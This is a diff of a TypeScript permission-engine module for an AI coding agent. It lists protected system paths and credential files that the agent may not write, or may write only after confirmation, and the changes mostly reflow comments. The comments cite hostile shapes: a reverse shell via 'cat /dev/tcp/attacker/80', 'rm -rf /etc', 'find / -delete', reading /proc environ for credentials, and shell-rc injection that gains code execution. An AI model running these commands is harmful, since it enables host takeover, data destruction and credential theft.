@@ -1,39 +1,38 @@
-// Protected paths per PERMISSION_ENGINE.md §11. Hardcoded in code,
-// NOT in policy file: policy can never relax these. Two tiers:
+// Protected paths. Hardcoded in code, NOT in policy file: policy
+// can never relax these. Two tiers:
 //
-//   - 'deny'     — refuse outright in any op. Reads and writes alike.
-//                  Applies to system pseudofs roots (/proc, /sys, /boot)
-//                  whose contents are kernel-managed; an LLM-driven write
-//                  there is always a bug or attack. Reads of these are
-//                  also rejected: legitimate need is rare, and a
+//   - 'deny'     — refuse outright in any op. Reads and writes
+//                  alike. Applies to system pseudofs roots (/proc,
+//                  /sys, /boot) whose contents are kernel-managed;
+//                  an LLM-driven write there is always a bug or
+//                  attack. Reads of these are also rejected:
+//                  legitimate need is rare, and a
 //                  "read /proc/<pid>/environ" probe is a known
 //                  credential-exfil shape.
 //
-//   - 'escalate' — uncovered by writes/deletes. An `allow` rule that
-//                  matches one of these paths is upgraded to `confirm`
-//                  before returning to the caller. `deny` rules still
-//                  win (operator who wants explicit deny on a parent
-//                  layer keeps that authority). Reads are not affected
-//                  — operators legitimately read /etc/hosts, .git/HEAD,
+//   - 'escalate' — uncovered by writes/deletes. An `allow` rule
+//                  that matches one of these paths is upgraded to
+//                  `confirm` before returning to the caller.
+//                  `deny` rules still win (operator who wants
+//                  explicit deny on a parent layer keeps that
+//                  authority). Reads are not affected — operators
+//                  legitimately read /etc/hosts, .git/HEAD,
 //                  ~/.bashrc.
 //
-// The `escalate` tier intentionally does NOT block writes outright.
-// `.git/HEAD` rewrites happen via `git_*` tools that have their own
-// confirm UX in policy; the operator can authorize `.git/` writes once
-// per session via the modal. The `deny` tier IS outright because there
-// is no analogous "git_* for /proc" — a write there is always wrong.
+// The `escalate` tier intentionally does NOT block writes
+// outright. `.git/HEAD` rewrites happen via `git_*` tools that
+// have their own confirm UX in policy; the operator can authorize
+// `.git/` writes once per session via the modal. The `deny` tier
+// IS outright because there is no analogous "git_* for /proc" — a
+// write there is always wrong.
 //
-// Bash-side enforcement (a `bash` tool running `rm -rf /etc`) is NOT
-// covered here: bash invocations consult `tools.bash`, not `tools.*_file`.
-// Closing that gap requires the bash AST resolver (PERMISSION_ENGINE.md
-// §5.2). Slice 147 (review fix): the bash resolver's `cmdRm` carries
-// the hardcoded `RM_REFUSE_ROOTS` blocklist for `rm` arguments that
-// resolve to `/`, `/etc`, `/usr`, `/home`, `~`, etc. — the literal
-// blocklist this comment pre-slice CLAIMED existed but didn't. The
-// score gate (capability_risk + workspace_escape + blocklist_command)
-// still adds defense in depth for non-rm shapes (e.g. `find / -delete`).
-// This module catches fs-tool-driven attempts (`write_file`, `edit_file`,
-// `glob`, `grep`) that bypass the bash AST entirely.
+// Bash-side enforcement (a `bash` tool running `rm -rf /etc`) is
+// NOT covered here: bash invocations consult `tools.bash`, not
+// `tools.*_file`. The bash resolver's `cmdRm` carries a hardcoded
+// `RM_REFUSE_ROOTS` blocklist; the score gate adds defense in
+// depth for non-rm shapes (`find / -delete`). This module catches
+// fs-tool-driven attempts (`write_file`, `edit_file`, `glob`,
+// `grep`) that bypass the bash AST entirely.
 
 import { resolve } from 'node:path';
 
@@ -48,50 +47,51 @@ export interface ProtectedClassifyInput {
   cwd: string;
 }
 
-// Absolute prefixes that always deny. Each entry is a directory: a
-// path classifies as `deny` when it equals one of these or descends
-// from one (`startsWithSegment` semantics — `/proc` matches `/proc/`
-// or `/proc/foo` but not `/procfoo`).
+// Absolute prefixes that always deny. Each entry is a directory:
+// a path classifies as `deny` when it equals one of these or
+// descends from one (`/proc` matches `/proc/foo` but not
+// `/procfoo`).
 //
-// `/dev` (slice 97, R2 finding #12): device nodes are kernel-managed
-// like /proc and /sys. An LLM-driven write to `/dev/sda` would
-// overwrite a raw disk; `cat /dev/tcp/attacker/80 > shell` is the
-// canonical reverse-shell-via-redirect shape. Reads of `/dev/random`
-// or `/dev/zero` are legitimate but rare; refusing them outright
-// pushes operators to explicitly invoke a non-LLM tool, which is
-// the safer default for kernel-managed pseudofs.
+// `/dev` — device nodes are kernel-managed like /proc and /sys.
+// An LLM-driven write to `/dev/sda` would overwrite a raw disk;
+// `cat /dev/tcp/attacker/80 > shell` is the canonical reverse-
+// shell-via-redirect shape. Reads of `/dev/random` or `/dev/zero`
+// are legitimate but rare; refusing them outright pushes
+// operators to explicitly invoke a non-LLM tool, which is the
+// safer default for kernel-managed pseudofs.
 //
-// Slice 180 (review — protected-path gap): `/var/run` + `/run` added.
-// Both host SOCKETS to privileged daemons: `/var/run/docker.sock`
-// (root container access), `/run/postgresql/.s.PGSQL.5432` (DB
-// admin), `/run/dbus/system_bus_socket` (system reconfig via
-// PolicyKit / systemd). Write to those sockets is game over for
-// the host. Read of socket files exposes daemon state. POSIX
-// semantics: `/var/run` is symlinked to `/run` on modern Linux
-// systemd hosts; we list both for portability — older distros
-// (Alpine, some embedded) still have a real `/var/run`.
+// `/var/run` + `/run`: both host SOCKETS to privileged daemons —
+// `/var/run/docker.sock` (root container access),
+// `/run/postgresql/.s.PGSQL.5432` (DB admin),
+// `/run/dbus/system_bus_socket` (system reconfig via PolicyKit /
+// systemd). Write to those sockets is game over for the host.
+// Read of socket files exposes daemon state. POSIX semantics:
+// `/var/run` is symlinked to `/run` on modern Linux systemd
+// hosts; we list both for portability — older distros (Alpine,
+// some embedded) still have a real `/var/run`.
 const SYSTEM_DENY_ROOTS: readonly string[] = ['/proc', '/sys', '/boot', '/dev', '/run', '/var/run'];
 
-// Tilde-rooted files that escalate on write. Each entry is resolved
-// against the operator's `$HOME` at classification time. We list the
-// canonical shell rc files plus the agent's own config dirs so the
-// model can't quietly amend the policy via `write_file`.
+// Tilde-rooted files that escalate on write. Each entry is
+// resolved against the operator's `$HOME` at classification time.
+// Lists canonical shell rc files plus the agent's own config
+// dirs so the model can't quietly amend the policy via
+// `write_file`.
 //
-// `.netrc` / `.npmrc` (slice 97, R2 P1 finding): per-protocol
-// credential files (`.netrc` for FTP/HTTP, `.npmrc` for the npm
-// registry). Operator writes to these are legitimate during account
-// setup but rare during agent work; escalating on write defends
-// against silent credential injection by a hostile agent definition.
+// `.netrc` / `.npmrc`: per-protocol credential files (`.netrc`
+// for FTP/HTTP, `.npmrc` for the npm registry). Operator writes
+// to these are legitimate during account setup but rare during
+// agent work; escalating on write defends against silent
+// credential injection by a hostile agent definition.
 //
-// Slice 180 (review — protected-path gap) additions:
+// Entries that need explanation:
 //   `.zshenv` — sourced in EVERY zsh invocation including
-//       non-interactive `zsh -c "..."` script form. Different from
-//       `.zshrc` (interactive-only); write here is RCE on every
-//       subsequent zsh subprocess. On macOS Catalina+ zsh is the
-//       default user shell, so this is the dominant attack path
-//       for "modify shell rc, gain RCE on next session". Paridade
-//       com `.bash_profile`.
-//   `.zprofile` — zsh login-shell init. Paralelo a `.bash_profile`.
+//       non-interactive `zsh -c "..."` script form. Different
+//       from `.zshrc` (interactive-only); write here is RCE on
+//       every subsequent zsh subprocess. On macOS Catalina+ zsh
+//       is the default user shell, so this is the dominant attack
+//       path for "modify shell rc, gain RCE on next session".
+//   `.zprofile` — zsh login-shell init. Parallel to
+//       `.bash_profile`.
 //   `.bash_aliases` — typically sourced by `.bashrc`; same RCE
 //       shape via aliases.
 //   `.config/fish/config.fish` — fish-shell init. XDG variant.
@@ -102,17 +102,17 @@ const SYSTEM_DENY_ROOTS: readonly string[] = ['/proc', '/sys', '/boot', '/dev', 
 //   `.gitconfig` — `core.sshCommand` / `core.pager` / `core.editor`
 //       / `credential.helper` / `[alias] *` are executable hooks
 //       that fire on standard git ops. Write is RCE on next
-//       `git pull`. ALREADY in HIDE_PATHS_FILES (sandbox-side);
-//       sync into the engine policy layer too so a tool running
+//       `git pull`. Also in HIDE_PATHS_FILES (sandbox-side); the
+//       engine policy layer must cover it too so a tool running
 //       in `degraded` (sandbox unavailable) or `host` profile
 //       still escalates the write.
 //   `.docker/config.json` — Docker registry auth + `credsStore`
 //       (helper-binary indirection — write is RCE on next
-//       docker login / pull / push). HIDE_PATHS sync.
-//   `.cargo/credentials.toml` — crates.io API token. HIDE_PATHS sync.
-//   `.git-credentials` — git HTTP creds store. HIDE_PATHS sync.
-//   `.pypirc` — PyPI auth token. HIDE_PATHS sync.
-//   `.boto` — Legacy AWS Boto creds. HIDE_PATHS sync.
+//       docker login / pull / push).
+//   `.cargo/credentials.toml` — crates.io API token.
+//   `.git-credentials` — git HTTP creds store.
+//   `.pypirc` — PyPI auth token.
+//   `.boto` — Legacy AWS Boto creds.
 const TILDE_ESCALATE_FILES: readonly string[] = [
   '.bashrc',
   '.zshrc',
@@ -134,26 +134,23 @@ const TILDE_ESCALATE_FILES: readonly string[] = [
   '.boto',
 ];
 
-// `.ssh`, `.aws`, `.gnupg`, `.kube` (slice 97, R2 P1 finding):
-// per-service credential trees. Writing any file under them admits
-// silent key/credential injection (`.ssh/authorized_keys`,
+// `.ssh`, `.aws`, `.gnupg`, `.kube`: per-service credential
+// trees. Writing any file under them admits silent
+// key/credential injection (`.ssh/authorized_keys`,
 // `.aws/credentials`, `.gnupg/private-keys-v1.d/`, `.kube/config`).
-// Reads pass through — agents legitimately enumerate `.kube/config`
-// to know which cluster they're targeting — but writes always
-// escalate. Adding these to the dir list (vs the file list) means
-// the classifier matches `.ssh/known_hosts` AND `.ssh/foo/bar`
-// alike via `startsWithSegment`.
+// Reads pass through — agents legitimately enumerate
+// `.kube/config` to know which cluster they're targeting — but
+// writes always escalate. Adding these to the dir list (vs the
+// file list) means the classifier matches `.ssh/known_hosts` AND
+// `.ssh/foo/bar` alike via `startsWithSegment`.
 //
-// Slice 180 (review — sync with HIDE_PATHS_DIRS). Pre-slice the
-// engine's escalate-tier list lagged the sandbox-side HIDE_PATHS
-// list by 10 entries. Sandbox masks credentials inside the
-// wrapped process; engine policy was the ONLY defense when running
-// in `degraded` (sandbox unavailable) or `host` profile. The
-// asymmetry meant a write to `.config/gcloud/credentials.db` from
+// This list is the dual of the sandbox-side HIDE_PATHS_DIRS.
+// Sandbox masks credentials inside the wrapped process; engine
+// policy is the ONLY defense when running in `degraded` (sandbox
+// unavailable) or `host` profile. The lists must stay in sync —
+// asymmetry means a write to `.config/gcloud/credentials.db` from
 // an fs tool in `mode: acceptEdits` + `host` profile would NOT
-// escalate to confirm — silent credential injection. Sync the
-// lists. Spec PR: SECURITY_GUIDELINE.md §8.4 + PERMISSION_ENGINE.md
-// §11 acknowledge the parallel.
+// escalate to confirm (silent credential injection).
 const TILDE_ESCALATE_DIRS: readonly string[] = [
   '.config/agent',
   '.config/claude',
@@ -196,20 +193,19 @@ const startsWithSegment = (path: string, prefix: string): boolean =>
 const resolveTildeFile = (home: string, file: string): string => resolve(home, file);
 const resolveCwdDir = (cwd: string, dir: string): string => resolve(cwd, dir);
 
-// Slice 161 (review — hot-path memoization). `classifyProtectedPath`
-// runs in the per-tool-call hot path AND inside the bash bypass
-// capability loop (per-cap). Pre-slice it called `resolve(home, file)`
-// 6 times for `TILDE_ESCALATE_FILES`, `resolve(home, dir)` 2 times for
-// `TILDE_ESCALATE_DIRS`, and `resolve(cwd, dir)` 3 times for
-// `CWD_ESCALATE_DIRS` on every invocation. `home` is frozen at
-// SessionStart per spec §4.3; `cwd` is also frozen. So the resolves
-// are pure on the (home, cwd) tuple and can be memoized.
+// Hot-path memoization. `classifyProtectedPath` runs in the
+// per-tool-call hot path AND inside the bash bypass capability
+// loop (per-cap). Without this cache, every invocation calls
+// `resolve(home, ...)` 20+ times for the tilde + cwd escalate
+// targets. `home` is frozen at SessionStart and `cwd` is also
+// frozen, so the resolves are pure on the (home, cwd) tuple.
 //
 // Cache key = `home + '\0' + cwd` (NUL byte separator avoids
-// collisions where one of the strings ends with the other). Cache
-// entries are bounded by the union of distinct (home, cwd) tuples
-// the process ever sees — for a typical agent session that's ONE
-// entry; even for tests bootstrapping many engines it's tens.
+// collisions where one of the strings ends with the other).
+// Cache entries are bounded by the union of distinct (home, cwd)
+// tuples the process ever sees — for a typical agent session
+// that's ONE entry; even for tests bootstrapping many engines
+// it's tens.
 
 interface ResolvedProtectedTargets {
   tildeEscalateFiles: readonly string[];
@@ -250,7 +246,7 @@ export const classifyProtectedPath = (input: ProtectedClassifyInput): ProtectedT
   for (const root of ABSOLUTE_ESCALATE_ROOTS) {
     if (startsWithSegment(absPath, root)) return 'escalate';
   }
-  // Tilde + cwd resolves come from the (home, cwd) cache — slice 161.
+  // Tilde + cwd resolves come from the (home, cwd) cache.
   const targets = getResolvedTargets(home, cwd);
   for (const file of targets.tildeEscalateFiles) {
     if (absPath === file) return 'escalate';
